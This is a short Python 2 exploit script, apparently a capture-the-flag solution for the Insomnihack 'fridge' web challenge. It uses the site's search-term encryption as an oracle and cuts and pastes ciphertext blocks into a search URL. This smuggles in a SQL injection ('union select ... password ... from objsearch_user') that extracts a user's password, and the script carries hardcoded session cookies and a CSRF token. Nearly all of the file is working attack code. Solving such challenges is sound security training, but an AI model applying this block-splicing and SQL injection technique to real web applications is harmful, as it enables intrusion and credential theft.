#!/usr/bin/env python
import urllib
import urllib2
 
payload_size = 128
csrftoken = 'SFxccKlvHQABbZQpLgHLNkvpO1ihMXgj'
cookie = '__cfduid=df9093cd64dab7e9f002f06f7ab222c7c1452525850; csrftoken=' + csrftoken + '; sessionid=xr31ii8u0l3pvxae38i9uj632vont2iu; AWSELB=033F977F02D671BCE8D4F0E661D7CA8279D94E64EFFE6BCEB05366353D63756EBAA058CB464DD800B7C1872783E27E3BAE7058F6D4BC6810BEC0739D56BBE463F63CC54BC91275B57E8FE8CBB9B39F65DFAFFA27C1'
headers = {'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)', 'Cookie': cookie}
 
def get_blocks(plaintext):
    url = 'http://fridge.insomnihack.ch/users/'
    data = {'csrfmiddlewaretoken': csrftoken, 'term': '000000000' + plaintext + '0000000000'}
    req = urllib2.Request(url, urllib.urlencode(data), headers)
    response = urllib2.urlopen(req)
    return response.geturl()[68:][:payload_size * 2]
 
def get_response(blocks):
    payload = 'bf7964b8a6bebaa0785e3e5a071f61838e86021b5bb8af94cc49b9d35b90aedd' + blocks + 'ae0c6d0770fbaf5fa4bb3f9214e5ea14'
    url = 'http://fridge.insomnihack.ch/search/' + payload
    req = urllib2.Request(url, headers=headers)
    response = urllib2.urlopen(req)
    print response.read()
 
def pad_payload(payload):
    prefix = 'ser '
    suffix = 'union select 0,0,0,0,0 from objsearch_u'
    payload = prefix + payload
    payload += " " * (payload_size - (len(payload) + len(suffix))) + suffix
    return payload
 
 
blocks = get_blocks(pad_payload('union select 1,password,31337,4,5 from objsearch_user where id=1'))
print get_response(blocks)